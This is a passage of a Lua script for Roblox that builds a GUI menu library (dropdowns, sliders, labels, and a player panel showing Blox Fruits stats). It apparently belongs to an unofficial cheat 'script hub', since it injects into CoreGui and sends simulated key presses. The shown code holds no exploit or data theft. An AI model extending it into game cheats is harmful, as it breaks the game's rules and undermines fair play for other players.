 UIPadding.PaddingTop = UDim.new(0, 5)
 
 DropImage.Name = "DropImage"
 DropImage.Parent = Dropdown
 DropImage.BackgroundColor3 = Color3.fromRGB(224,224,224)
 DropImage.BackgroundTransparency = 1.000
 DropImage.Position = UDim2.new(0, 220, 0, 6)
 DropImage.Rotation = 180.000
 DropImage.Size = UDim2.new(0, 20, 0, 20)
 DropImage.Image = "rbxassetid://6031090990"
 
 DropButton.Name = "DropButton"
 DropButton.Parent = Dropdown
 DropButton.BackgroundColor3 = Color3.fromRGB(224,224,224)
 DropButton.BackgroundTransparency = 1.000
 DropButton.Size = UDim2.new(0, 360, 0, 31)
 DropButton.Font = Enum.Font.SourceSans
 DropButton.Text = ""
 DropButton.TextColor3 = Color3.fromRGB(0, 0, 0)
 DropButton.TextSize = 14.000
 
 for i,v in next,option do
 local Item = Instance.new("TextButton")
 
 Item.Name = "Item"
 Item.Parent = DropScroll
 Item.BackgroundColor3 = Color3.fromRGB(224,224,224)
 Item.BackgroundTransparency = 1.000
 Item.Size = UDim2.new(0, 243, 0, 26)
 Item.Font = Enum.Font.GothamSemibold
 Item.Text = tostring(v)
 Item.TextColor3 = Color3.fromRGB(225, 225, 225)
 Item.TextSize = 13.000
 Item.TextTransparency = 0.500
 
 Item.MouseEnter:Connect(function()
  TweenService:Create(
   Item,
   TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    TextTransparency = 0
   }
  ):Play()
  end)
 
 Item.MouseLeave:Connect(function()
  TweenService:Create(
   Item,
   TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    TextTransparency = 0.5
   }
  ):Play()
  end)
 
 Item.MouseButton1Click:Connect(function()
  isdropping = false
  Dropdown:TweenSize(UDim2.new(0,243,0,31),"Out","Quad",0.3,true)
  TweenService:Create(
   DropImage,
   TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    Rotation = 180
   }
  ):Play()
  callback(Item.Text)
  DropTitle.Text = text.." : "..Item.Text
  end)
 end
 
 DropScroll.CanvasSize = UDim2.new(0,0,0,UIListLayout.AbsoluteContentSize.Y + 10)
 
 DropButton.MouseButton1Click:Connect(function()
  if isdropping == false then
  isdropping = true
  Dropdown:TweenSize(UDim2.new(0,243,0,131),"Out","Quad",0.3,true)
  TweenService:Create(
   DropImage,
   TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    Rotation = 0
   }
  ):Play()
  else
   isdropping = false
  Dropdown:TweenSize(UDim2.new(0,243,0,31),"Out","Quad",0.3,true)
  TweenService:Create(
   DropImage,
   TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    Rotation = 180
   }
  ):Play()
  end
  end)
 
 local dropfunc = {}
 function dropfunc:Add(t)
 local Item = Instance.new("TextButton")
 Item.Name = "Item"
 Item.Parent = DropScroll
 Item.BackgroundColor3 = Color3.fromRGB(224,224,224)
 Item.BackgroundTransparency = 1.000
 Item.Size = UDim2.new(0, 243, 0, 26)
 Item.Font = Enum.Font.GothamSemibold
 Item.Text = tostring(t)
 Item.TextColor3 = Color3.fromRGB(225, 225, 225)
 Item.TextSize = 13.000
 Item.TextTransparency = 0.500
 
 Item.MouseEnter:Connect(function()
  TweenService:Create(
   Item,
   TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    TextTransparency = 0
   }
  ):Play()
  end)
 
 Item.MouseLeave:Connect(function()
  TweenService:Create(
   Item,
   TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    TextTransparency = 0.5
   }
  ):Play()
  end)
 
 Item.MouseButton1Click:Connect(function()
  isdropping = false
  Dropdown:TweenSize(UDim2.new(0,243,0,31),"Out","Quad",0.3,true)
  TweenService:Create(
   DropImage,
   TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    Rotation = 180
   }
  ):Play()
  callback(Item.Text)
  DropTitle.Text = text.." : "..Item.Text
  end)
 end
 function dropfunc:Clear()
 DropTitle.Text = tostring(text).." : "
 isdropping = false
 Dropdown:TweenSize(UDim2.new(0,243,0,31),"Out","Quad",0.3,true)
 TweenService:Create(
  DropImage,
  TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
  {
   Rotation = 180
  }
 ):Play()
 for i,v in next, DropScroll:GetChildren() do
 if v:IsA("TextButton") then
 v:Destroy()
 end
 end
 end
 return dropfunc
 end

 _G.BGColor_1 = Color3.fromRGB(30,30,30)
 _G.BGColor_2 = Color3.fromRGB(20, 20, 20)
 _G.WindowBackgroundColor = Color3.fromRGB(12,12,12)
 _G.BackgroundItemColor = Color3.fromRGB(20, 20, 20)
 _G.TabWindowColor = Color3.fromRGB(30, 30, 30)
 _G.ContainerColor = Color3.fromRGB(30, 30, 30)
 _G.TitleTextColor = Color3.fromRGB(150, 150, 150)
 _G.ImageColor = Color3.fromRGB(150, 150, 150)
 _G.LineThemeColor = Color3.fromRGB(150, 150, 150)
 _G.TabTextColor = Color3.fromRGB(150, 150, 150)
 _G.TabImageColor = Color3.fromRGB(150, 150, 150)
 _G.TabThemeColor = Color3.fromRGB(250, 0, 0)
 _G.SectionColor = Color3.fromRGB(150, 150, 150)
 _G.SectionImageColor = Color3.fromRGB(150, 150, 150)
 _G.SectionTextColor = Color3.fromRGB(150, 150, 150)
 _G.SectionOn = Color3.fromRGB(0, 250, 0)
 
 function main:Slider(text,min,max,set,callback)
 local Slider = Instance.new("Frame")
 local slidercorner = Instance.new("UICorner")
 local sliderr = Instance.new("Frame")
 local sliderrcorner = Instance.new("UICorner")
 local SliderLabel = Instance.new("TextLabel")
 local HAHA = Instance.new("Frame")
 local AHEHE = Instance.new("TextButton")
 local bar = Instance.new("Frame")
 local bar1 = Instance.new("Frame")
 local bar1corner = Instance.new("UICorner")
 local barcorner = Instance.new("UICorner")
 local circlebar = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
 local slidervalue = Instance.new("Frame")
 local valuecorner = Instance.new("UICorner")
 local TextBox = Instance.new("TextBox")
 local UICorner_2 = Instance.new("UICorner")
 local posto = Instance.new("UIStroke")
 local posto4 = Instance.new("UIStroke")
 
 Slider.Name = "Slider"
 Slider.Parent = ScrollPage
 Slider.BackgroundColor3 = Color3.fromRGB(255,255,255)
 Slider.BackgroundTransparency = 1
 Slider.Size = UDim2.new(0, 243, 0, 51)
 
 posto4.Name = "posto"
 posto4.Parent = Slider
 posto4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 posto4.Color = Color3.fromRGB(224,224,224)
 posto4.LineJoinMode = Enum.LineJoinMode.Round
 posto4.Thickness = 1
 posto4.Transparency = 0.5
 posto4.Enabled = true
 posto4.Archivable = true
 
 slidercorner.CornerRadius = UDim.new(0, 5)
 slidercorner.Name = "slidercorner"
 slidercorner.Parent = Slider
 
 sliderr.Name = "sliderr"
 sliderr.Parent = Slider
 sliderr.BackgroundTransparency = 1
 sliderr.BackgroundColor3 = Color3.fromRGB(30,30,30)
 sliderr.Position = UDim2.new(0, 1, 0, 1)
 sliderr.Size = UDim2.new(0, 243, 0, 49)
 
 sliderrcorner.CornerRadius = UDim.new(0, 5)
 sliderrcorner.Name = "sliderrcorner"
 sliderrcorner.Parent = sliderr
 
 SliderLabel.Name = "SliderLabel"
 SliderLabel.Parent = sliderr
 SliderLabel.BackgroundColor3 = Color3.fromRGB(224,224,224)
 SliderLabel.BackgroundTransparency = 1.000
 SliderLabel.Position = UDim2.new(0, 15, 0, 0)
 SliderLabel.Size = UDim2.new(0, 180, 0, 26)
 SliderLabel.Font = Enum.Font.GothamSemibold
 SliderLabel.Text = text
 SliderLabel.TextColor3 = Color3.fromRGB(224,224,224)
 SliderLabel.TextSize = 12.000
 SliderLabel.TextTransparency = 0
 SliderLabel.TextXAlignment = Enum.TextXAlignment.Left
 
 HAHA.Name = "HAHA"
 HAHA.Parent = sliderr
 HAHA.BackgroundColor3 = Color3.fromRGB(224,224,224)
 HAHA.BackgroundTransparency = 1.000
 HAHA.Size = UDim2.new(0, 243, 0, 29)
 
 AHEHE.Name = "AHEHE"
 AHEHE.Parent = sliderr
 AHEHE.BackgroundColor3 = Color3.fromRGB(224,224,224)
 AHEHE.BackgroundTransparency = 1.000
 AHEHE.Position = UDim2.new(0, 10, 0, 35)
 AHEHE.Size = UDim2.new(0, 243, 0, 5)
 AHEHE.Font = Enum.Font.SourceSans
 AHEHE.Text = ""
 AHEHE.TextColor3 = Color3.fromRGB(0, 0, 0)
 AHEHE.TextSize = 14.000
 
 bar.Name = "bar"
 bar.Parent = AHEHE
 bar.BackgroundColor3 = _G.BGColor_2
 bar.Size = UDim2.new(0, 225, 0, 5)
 
 bar1.Name = "bar1"
 bar1.Parent = bar
 bar1.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
 bar1.BackgroundTransparency = 0
 bar1.Size = UDim2.new(set/max, 0, 0, 5)
 
 bar1corner.CornerRadius = UDim.new(0, 5)
 bar1corner.Name = "bar1corner"
 bar1corner.Parent = bar1
 
 barcorner.CornerRadius = UDim.new(0, 5)
 barcorner.Name = "barcorner"
 barcorner.Parent = bar
 
 circlebar.Name = "circlebar"
 circlebar.Parent = bar1
 circlebar.BackgroundColor3 = Color3.fromRGB(224,224,224)
 circlebar.Position = UDim2.new(1, -2, 0, -3)
 circlebar.Size = UDim2.new(0, 10, 0, 10)
 
 UICorner.CornerRadius = UDim.new(0, 100)
 UICorner.Parent = circlebar
 
 slidervalue.Name = "slidervalue"
 slidervalue.Parent = sliderr
 slidervalue.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
 slidervalue.BackgroundTransparency = 1
 slidervalue.Position = UDim2.new(0, 155, 0, 5)
 slidervalue.Size = UDim2.new(0, 65, 0, 18)
 
 valuecorner.CornerRadius = UDim.new(0, 5)
 valuecorner.Name = "valuecorner"
 valuecorner.Parent = slidervalue
 
 TextBox.Parent = slidervalue
 TextBox.BackgroundColor3 = _G.BGColor_2
 TextBox.Position = UDim2.new(0, 15, 0, 0)
 TextBox.Size = UDim2.new(0, 60, 0, 20)
 TextBox.Font = Enum.Font.GothamSemibold
 TextBox.TextColor3 = Color3.fromRGB(224,224,224)
 TextBox.TextSize = 9.000
 TextBox.Text = set
 TextBox.TextTransparency = 0
 
 posto.Name = "posto"
 posto.Parent = TextBox
 posto.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 posto.Color = Color3.fromRGB(224,224,224)
 posto.LineJoinMode = Enum.LineJoinMode.Round
 posto.Thickness = 1
 posto.Transparency = 0
 posto.Enabled = true
 posto.Archivable = true
 
 UICorner_2.CornerRadius = UDim.new(0, 5)
 UICorner_2.Parent = TextBox
 
 local mouse = game.Players.LocalPlayer:GetMouse()
 local uis = game:GetService("UserInputService")
 
 if Value == nil then
 Value = set
 pcall(function()
  callback(Value)
  end)
 end
 
 AHEHE.MouseButton1Down:Connect(function()
  Value = math.floor((((tonumber(max) - tonumber(min)) / 250) * bar1.AbsoluteSize.X) + tonumber(min)) or 0
  pcall(function()
   callback(Value)
   end)
  bar1.Size = UDim2.new(0, math.clamp(mouse.X - bar1.AbsolutePosition.X, 0, 250), 0, 5)
  circlebar.Position = UDim2.new(0, math.clamp(mouse.X - bar1.AbsolutePosition.X - 2, 0, 228), 0, -3)
  moveconnection = mouse.Move:Connect(function()
   TextBox.Text = Value
   Value = math.floor((((tonumber(max) - tonumber(min)) / 320) * bar1.AbsoluteSize.X) + tonumber(min))
   pcall(function()
    callback(Value)
    end)
   bar1.Size = UDim2.new(0, math.clamp(mouse.X - bar1.AbsolutePosition.X, 0, 250), 0, 5)
   circlebar.Position = UDim2.new(0, math.clamp(mouse.X - bar1.AbsolutePosition.X - 2, 0, 228), 0, -3)
   end)
  releaseconnection = uis.InputEnded:Connect(function(Mouse)
   if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then
   Value = math.floor((((tonumber(max) - tonumber(min)) / 250) * bar1.AbsoluteSize.X) + tonumber(min))
   pcall(function()
    callback(Value)
    end)
   bar1.Size = UDim2.new(0, math.clamp(mouse.X - bar1.AbsolutePosition.X, 0, 250), 0, 5)
   circlebar.Position = UDim2.new(0, math.clamp(mouse.X - bar1.AbsolutePosition.X - 2, 0, 228), 0, -3)
   moveconnection:Disconnect()
   releaseconnection:Disconnect()
   end
   end)
  end)
 releaseconnection = uis.InputEnded:Connect(function(Mouse)
  if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then
  Value = math.floor((((tonumber(max) - tonumber(min)) / 250) * bar1.AbsoluteSize.X) + tonumber(min))
  TextBox.Text = Value
  end
  end)
 
 TextBox.FocusLost:Connect(function()
  if tonumber(TextBox.Text) > max then
  TextBox.Text = max
  end
  bar1.Size = UDim2.new((TextBox.Text or 0) / max, 0, 0, 5)
  circlebar.Position = UDim2.new(1, -2, 0, -3)
  TextBox.Text = tostring(TextBox.Text and math.floor((TextBox.Text / max) * (max - min) + min))
  pcall(callback, TextBox.Text)
  end)
 end

function main:PlayerInfo()

local UserID = game.Players.LocalPlayer.UserId

local ThumbType = Enum.ThumbnailType.HeadShot
local ThumbSize = Enum.ThumbnailSize.Size420x420
local Content = game.Players:GetUserThumbnailAsync(UserID,ThumbType,ThumbSize)

local PlayerInfoFrame = Instance.new("Frame")
local PlayerInfoFrameUICorner = Instance.new("UICorner")
local ImageLabel = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local Name = Instance.new("TextLabel")
local Lvl = Instance.new("TextLabel")
local Fruit = Instance.new("TextLabel")

local Line = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")

Line.Name = "Line"
Line.Parent = PlayerInfoFrame
Line.AnchorPoint = Vector2.new(0.5, 0.5)
Line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Line.BorderSizePixel = 0
Line.BackgroundTransparency = 1
Line.Position = UDim2.new(0.5, 0, 0.311723471, 0)
Line.Size = UDim2.new(0, 300, 0, 1)

UIGradient.Color = ColorSequence.new {
  ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30,30,30)), ColorSequenceKeypoint.new(0.29, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.68, Color3.fromRGB(170, 0, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(30,30,30))}
UIGradient.Parent = Line

PlayerInfoFrame.Name = "PlayerInfoFrame"
PlayerInfoFrame.Parent = ScrollPage
PlayerInfoFrame.Active = true
PlayerInfoFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
PlayerInfoFrame.BackgroundTransparency = 1
PlayerInfoFrame.BorderSizePixel = 0
PlayerInfoFrame.Size = UDim2.new(0, 300, 0, 285)

PlayerInfoFrameUICorner.Name = "PlayerInfoFrameUICorner"
PlayerInfoFrameUICorner.Parent = PlayerInfoFrame

ImageLabel.Parent = PlayerInfoFrame
ImageLabel.Active = true
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0, 45, 0, 45)
ImageLabel.Size = UDim2.new(0, 70, 0, 70)
ImageLabel.Image = Content

UICorner.Parent = ImageLabel

Name.Name = "Name"
Name.Parent = PlayerInfoFrame
Name.Active = true
Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Name.BackgroundTransparency = 1.000
Name.Position = UDim2.new(0.29916666, 0, 0, 0)
Name.Size = UDim2.new(0, 200, 0, 27)
Name.Font = Enum.Font.GothamBold
Name.TextColor3 = Color3.fromRGB(255, 255, 255)
Name.TextSize = 12.000
Name.Text = game.Players.LocalPlayer.Name.. " ("..game.Players.LocalPlayer.DisplayName..")"
Name.TextXAlignment = Enum.TextXAlignment.Left

Lvl.Name = "Lvl"
Lvl.Parent = PlayerInfoFrame
Lvl.Active = true
Lvl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Lvl.BackgroundTransparency = 1.000
Lvl.Position = UDim2.new(0, 85, 0.113057934, 0)
Lvl.Size = UDim2.new(0, 200, 0, 27)
Lvl.TextTransparency = 0.8
Lvl.Font = Enum.Font.GothamBold
Lvl.TextColor3 = Color3.fromRGB(255, 255, 255)
Lvl.TextSize = 12.000
Lvl.TextXAlignment = Enum.TextXAlignment.Left

Fruit.Name = "Fruit"
Fruit.Parent = PlayerInfoFrame
Fruit.Active = true
Fruit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Fruit.BackgroundTransparency = 1.000
Fruit.Position = UDim2.new(0, 85, 0.199820146, 0)
Fruit.Size = UDim2.new(0, 200, 0, 27)
Fruit.Font = Enum.Font.GothamBold
Fruit.TextTransparency = 0.8
Fruit.TextColor3 = Color3.fromRGB(255, 255, 255)
Fruit.TextSize = 12.000
Fruit.TextXAlignment = Enum.TextXAlignment.Left

local id = game.PlaceId

if id == 2753915549 or id == 4442272183 or id == 7449423635 then
Fruit.Text = "Devil Fruit : "..game:GetService("Players").LocalPlayer.Data.DevilFruit.Value.. " / ".. "Race : " ..game:GetService("Players").LocalPlayer.Data.Race.Value
else
  Fruit.Text = "Don't Find Your Database"
Lvl.Text = "Don't Find Your Database"
end

local HealthBar = Instance.new("Frame")
local HealthBarUICorner = Instance.new("UICorner")
local HealthText = Instance.new("TextLabel")
local Line = Instance.new("Frame")
local LineHealth = Instance.new("Frame")

HealthBar.Name = "HealthBar"
HealthBar.Parent = PlayerInfoFrame
HealthBar.BackgroundColor3 = Color3.fromRGB(40,40,40)
HealthBar.BorderSizePixel = 0
HealthBar.BackgroundTransparency = 1
HealthBar.Position = UDim2.new(0.0187500007, 0, 0.340836018, 0)
HealthBar.Size = UDim2.new(0, 300, 0, 45)

HealthBarUICorner.CornerRadius = UDim.new(0, 4)
HealthBarUICorner.Name = "HealthBarUICorner"
HealthBarUICorner.Parent = HealthBar

HealthText.Name = "HealthText"
HealthText.Parent = HealthBar
HealthText.Active = true
HealthText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HealthText.BackgroundTransparency = 1.000
HealthText.Position = UDim2.new(0.0260000005, 0, 0.100000001, 0)
HealthText.Size = UDim2.new(0, 300, 0, 22)
HealthText.Font = Enum.Font.GothamBold
HealthText.Text = "Health"
HealthText.TextColor3 = Color3.fromRGB(85, 255, 127)
HealthText.TextSize = 12.000
HealthText.TextWrapped = true
HealthText.TextXAlignment = Enum.TextXAlignment.Left

Line.Name = "Line"
Line.Parent = HealthBar
Line.AnchorPoint = Vector2.new(0.5, 0.5)
Line.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Line.BorderSizePixel = 0
Line.Position = UDim2.new(0.498908311, 0, 0.766666651, 0)
Line.Size = UDim2.new(0, 300, 0, 5)

LineHealth.Name = "LineHealth"
LineHealth.Parent = Line
LineHealth.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
LineHealth.BorderSizePixel = 0
LineHealth.Size = UDim2.new(0, 300, 0, 5)

local StaminaBar = Instance.new("Frame")
local StaminaBarUICorner = Instance.new("UICorner")
local StaminaText = Instance.new("TextLabel")
local StaminaLine = Instance.new("Frame")
local LineStamina = Instance.new("Frame")

StaminaBar.Name = "StaminaBar"
StaminaBar.Parent = PlayerInfoFrame
StaminaBar.BackgroundColor3 = Color3.fromRGB(40,40,40)
StaminaBar.BorderSizePixel = 0
StaminaBar.BackgroundTransparency = 1
StaminaBar.Position = UDim2.new(0.0166666675, 0, 0.50803858, 0)
StaminaBar.Size = UDim2.new(0, 300, 0, 45)

StaminaBarUICorner.CornerRadius = UDim.new(0, 4)
StaminaBarUICorner.Name = "StaminaBarUICorner"
StaminaBarUICorner.Parent = StaminaBar

StaminaText.Name = "StaminaText"
StaminaText.Parent = StaminaBar
StaminaText.Active = true
StaminaText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StaminaText.BackgroundTransparency = 1.000
StaminaText.Position = UDim2.new(0.0260000005, 0, 0.100000001, 0)
StaminaText.Size = UDim2.new(0, 300, 0, 22)
StaminaText.Font = Enum.Font.GothamBold
StaminaText.Text = "Stamina"
StaminaText.TextColor3 = Color3.fromRGB(85, 170, 255)
StaminaText.TextSize = 12.000
StaminaText.TextWrapped = true
StaminaText.TextXAlignment = Enum.TextXAlignment.Left

StaminaLine.Name = "StaminaLine"
StaminaLine.Parent = StaminaBar
StaminaLine.AnchorPoint = Vector2.new(0.5, 0.5)
StaminaLine.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
StaminaLine.BorderSizePixel = 0
StaminaLine.Position = UDim2.new(0.498908311, 0, 0.766666651, 0)
StaminaLine.Size = UDim2.new(0, 300, 0, 5)

LineStamina.Name = "LineStamina"
LineStamina.Parent = StaminaLine
LineStamina.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
LineStamina.BorderSizePixel = 0
LineStamina.Size = UDim2.new(0, 300, 0, 5)

local Beli = Instance.new("TextLabel")
local Fragment = Instance.new("TextLabel")

Beli.Name = "Beli"
Beli.Parent = PlayerInfoFrame
Beli.Active = true
Beli.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Beli.BackgroundTransparency = 1.000
Beli.Position = UDim2.new(0.018749997, 0, 0.67897433, 0)
Beli.Size = UDim2.new(0, 200, 0, 27)
Beli.Font = Enum.Font.GothamBold
Beli.TextColor3 = Color3.fromRGB(85, 255, 127)
Beli.TextSize = 14.000
Beli.TextXAlignment = Enum.TextXAlignment.Left

Fragment.Name = "Fragment"
Fragment.Parent = PlayerInfoFrame
Fragment.Active = true
Fragment.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Fragment.BackgroundTransparency = 1.000
Fragment.Position = UDim2.new(0.018749997, 0, 0.765791059, 0)
Fragment.Size = UDim2.new(0, 200, 0, 27)
Fragment.Font = Enum.Font.GothamBold
Fragment.TextColor3 = Color3.fromRGB(170, 85, 255)
Fragment.TextSize = 14.000
Fragment.TextXAlignment = Enum.TextXAlignment.Left

local Bounty = Instance.new("TextLabel")

Bounty.Name = "Bounty"
Bounty.Parent = PlayerInfoFrame
Bounty.Active = true
Bounty.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bounty.BackgroundTransparency = 1.000
Bounty.Position = UDim2.new(0.018749997, 0, 0.852607787, 0)
Bounty.Size = UDim2.new(0, 200, 0, 27)
Bounty.Font = Enum.Font.GothamBold
Bounty.TextColor3 = Color3.fromRGB(255, 170, 0)
Bounty.TextSize = 14.000
Bounty.TextXAlignment = Enum.TextXAlignment.Left

spawn(function()
  while wait(0.001) do
  pcall(function()
    Lvl.Text = "Level : "..game:GetService("Players").LocalPlayer.Data.Level.Value
    Beli.Text = "Beli : "..game:GetService("Players").LocalPlayer.Data.Beli.Value
    Fragment.Text = "Fragments : "..game:GetService("Players").LocalPlayer.Data.Fragments.Value
    Bounty.Text = "Bounty : "..game:GetService("Players").LocalPlayer.leaderstats["Bounty/Honor"].Value
    StaminaText.Text = "Stamina : "..game.Players.LocalPlayer.Character.Energy.Value.."/"..game.Players.LocalPlayer.Character.Energy.MaxValue
    TweenService:Create(
      LineStamina,
      TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
      {
        Size = UDim2.new(game.Players.LocalPlayer.Character.Energy.Value/game.Players.LocalPlayer.Character.Energy.MaxValue, 0, 1, 0)} -- UDim2.new(0, 128, 0, 25)
    ):Play()

    HealthText.Text = "Health : "..game.Players.LocalPlayer.Character.Humanoid.Health.."/"..game.Players.LocalPlayer.Character.Humanoid.MaxHealth
    TweenService:Create(
      LineHealth,
      TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
      {
        Size = UDim2.new(game.Players.LocalPlayer.Character.Humanoid.Health/game.Players.LocalPlayer.Character.Humanoid.MaxHealth, 0, 0, 5)} -- UDim2.new(0, 128, 0, 25)
    ):Play()
    end)
  end
  end)
end

function main:Seperator(text)
                local Seperator = Instance.new("Frame")
                local Sep1 = Instance.new("Frame")
                local Sep2 = Instance.new("TextLabel")
                local Sep3 = Instance.new("Frame")
                local labelll = {}
                
                Seperator.Name = "Seperator"
                Seperator.Parent = ScrollPage
                Seperator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                Seperator.BackgroundTransparency = 1.000
                Seperator.Size = UDim2.new(0, 230, 0, 20)
                
                Sep1.Name = "Sep1"
                Sep1.Parent = Seperator
                Sep1.BackgroundColor3 = _G.Color
                Sep1.BorderSizePixel = 0
                Sep1.Position = UDim2.new(0, 0, 0, 10)
                Sep1.Size = UDim2.new(0, 50, 0, 1)
                
                Sep2.Name = "Sep2"
                Sep2.Parent = Seperator
                Sep2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                Sep2.BackgroundTransparency = 1.000
                Sep2.Position = UDim2.new(0, 80, 0, 0)
                Sep2.Size = UDim2.new(0, 100, 0, 20)
                Sep2.Font = Enum.Font.GothamSemibold
                Sep2.Text = text
                Sep2.TextColor3 = Color3.fromRGB(255, 255, 255)
                Sep2.TextSize = 12.000
                
                Sep3.Name = "Sep3"
                Sep3.Parent = Seperator
                Sep3.BackgroundColor3 = _G.Color
                Sep3.BorderSizePixel = 0
                Sep3.Position = UDim2.new(0, 200, 0, 10)
                Sep3.Size = UDim2.new(0, 40, 0, 1)
                function labelll:AddText(newtext)
                    Sep2.Text = newtext
                end
                return labelll
            end
 function main:Label(text)
 local Label = Instance.new("TextLabel")
 local PaddingLabel = Instance.new("UIPadding")
 local labelfunc = {}
 
 Label.Name = "Label"
 Label.Parent = ScrollPage
 Label.BackgroundColor3 = Color3.fromRGB(224,224,224)
 Label.BackgroundTransparency = 1.000
 Label.Size = UDim2.new(0, 325, 0, 20)
 Label.Font = Enum.Font.GothamSemibold
 Label.TextColor3 = Color3.fromRGB(225, 225, 225)
 Label.TextSize = 12.000
 Label.Text = text
 Label.TextXAlignment = Enum.TextXAlignment.Left
 
 PaddingLabel.PaddingLeft = UDim.new(0,15)
 PaddingLabel.Parent = Label
 PaddingLabel.Name = "PaddingLabel"
 
 function labelfunc:Set(newtext)
 Label.Text = newtext
 end
 return labelfunc
 end
            return main
        end
		return uitab
		end
	return Ui
end
local ScreenGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")
		
ScreenGui.Name = "ImageButton"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		
ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
ImageButton.Size = UDim2.new(0, 50, 0, 50)
ImageButton.Draggable = true
ImageButton.Image = "http://www.roblox.com/asset/?id="..(LogoUI)
ImageButton.MouseButton1Down:connect(function()
	game:GetService("VirtualInputManager"):SendKeyEvent(true,305,false,game)
    game:GetService("VirtualInputManager"):SendKeyEvent(false,305,false,game)
end)
UICorner.Parent = ImageButton
